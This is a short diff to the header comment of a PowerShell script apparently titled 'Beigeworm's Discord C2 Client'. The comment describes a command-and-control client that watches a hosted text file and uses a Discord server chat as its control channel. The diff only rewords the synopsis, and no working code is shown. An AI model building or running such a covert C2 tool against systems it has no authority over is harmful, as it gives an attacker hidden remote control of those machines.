@@ -1,7 +1,7 @@
 <# ============================================= Beigeworm's Discord C2 Client ========================================================
 
 **SYNOPSIS**
-Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
+Using a Discord Server Chat and a hosted text file to Act as a Command and Control Platform.
 
 INFORMATION
 This script will wait until it notices a change in the contents of a text file hosted online (eg. github).
